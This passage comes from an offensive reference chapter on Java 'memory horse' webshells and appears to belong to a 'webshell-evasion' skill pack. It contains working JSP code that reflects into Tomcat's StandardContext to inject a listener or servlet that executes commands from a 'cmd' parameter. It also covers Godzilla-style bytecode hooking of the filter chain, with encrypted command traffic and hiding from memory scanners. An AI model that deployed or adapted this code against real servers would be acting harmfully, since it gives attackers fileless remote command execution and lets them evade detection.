### 6.2 Java Listener Memory Horse

```java
<%@ page import="javax.servlet.*,org.apache.catalina.core.*,java.lang.reflect.*" %>
<%
// Get StandardContext
ServletContext ctx = request.getServletContext();
Field f = ctx.getClass().getDeclaredField("context");
f.setAccessible(true);
ApplicationContext appCtx = (ApplicationContext) f.get(ctx);
f = appCtx.getClass().getDeclaredField("context");
f.setAccessible(true);
StandardContext stdCtx = (StandardContext) f.get(appCtx);

// Create malicious request listener
ServletRequestListener listener = new ServletRequestListener() {
    public void requestInitialized(ServletRequestEvent sre) {
        HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
        String cmd = req.getParameter("cmd");
        if (cmd != null) {
            try {
                Process p = Runtime.getRuntime().exec(cmd);
                java.util.Scanner s = new java.util.Scanner(p.getInputStream()).useDelimiter("\\A");
                req.setAttribute("result", s.hasNext() ? s.next() : "");
            } catch (Exception e) {}
        }
    }
    public void requestDestroyed(ServletRequestEvent sre) {
        HttpServletResponse resp = (HttpServletResponse) sre.getServletRequest()
            .getAttribute("javax.servlet.request.X");
        // Can't easily get response here; use a different approach
    }
};

stdCtx.addApplicationEventListener(listener);
out.println("Listener memory horse injected");
%>
```

### 6.3 Java Servlet Memory Horse

```java
<%@ page import="javax.servlet.*,javax.servlet.http.*,org.apache.catalina.core.*,java.lang.reflect.*" %>
<%
// Create a servlet wrapper
HttpServlet servlet = new HttpServlet() {
    protected void service(HttpServletRequest req, HttpServletResponse resp)
            throws ServletException, IOException {
        String cmd = req.getParameter("cmd");
        if (cmd != null) {
            try {
                Process p = Runtime.getRuntime().exec(cmd);
                java.util.Scanner s = new java.util.Scanner(p.getInputStream()).useDelimiter("\\A");
                resp.getWriter().write(s.hasNext() ? s.next() : "");
            } catch (Exception e) {
                resp.getWriter().write("Error: " + e.getMessage());
            }
        }
    }
};

// Get StandardContext
ServletContext ctx = request.getServletContext();
Field f = ctx.getClass().getDeclaredField("context");
f.setAccessible(true);
ApplicationContext appCtx = (ApplicationContext) f.get(ctx);
f = appCtx.getClass().getDeclaredField("context");
f.setAccessible(true);
StandardContext stdCtx = (StandardContext) f.get(appCtx);

// Create wrapper and add servlet
org.apache.catalina.Wrapper wrapper = stdCtx.createWrapper();
wrapper.setName("MemoryServlet");
wrapper.setServletClass(servlet.getClass().getName());
wrapper.setServlet(servlet);
stdCtx.addChild(wrapper);
stdCtx.addServletMappingDecoded("/memory/*", "MemoryServlet");

out.println("Servlet memory horse injected at /memory/*");
%>
```

### 6.4 Godzilla Memory Horse

Godzilla's memory horse is injected via Java agent or JSP, using advanced techniques to hide from memory scanners.

**Godzilla memory horse injection concept:**

```
1. Attach as Java Agent (.jar)
2. Use Instrumentation API to modify loaded classes
3. Inject into Tomcat/Jetty/Undertow/WebLogic/WebSphere pipeline
4. Hook into FilterChain.doFilter() or Servlet.service()
5. Use Unsafe or JNI to hide from memory scanners
6. Encrypt communication using custom cipher
```

**Godzilla filter chain hook injection:**

```java
// Pseudo-code for Godzilla-style memory horse injection
Class<?> filterChainClass = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
Method doFilterMethod = filterChainClass.getDeclaredMethod("internalDoFilter",
    ServletRequest.class, ServletResponse.class);

// Use ASM/Javassist to modify bytecode of doFilter
ClassPool pool = ClassPool.getDefault();
CtClass ctClass = pool.get("org.apache.catalina.core.ApplicationFilterChain");
CtMethod ctMethod = ctClass.getDeclaredMethod("internalDoFilter");

ctMethod.insertBefore("""
    if (request.getParameter("godzilla_pass") != null) {
        // Godzilla protocol handler
        byte[] cmd = GodzillaCipher.decrypt(request.getParameter("data"));
        byte[] result = GodzillaExecutor.execute(cmd);
        response.getWriter().write(GodzillaCipher.encrypt(result));
        return;
    }
""");

// Load modified class into JVM
ctClass.toClass();
```



---
📖 本切片 2/3 结束。 续篇: `skill_view(name="webshell-evasion", file_path="references/chapter-06-memory-horse-techniques-03.md")`
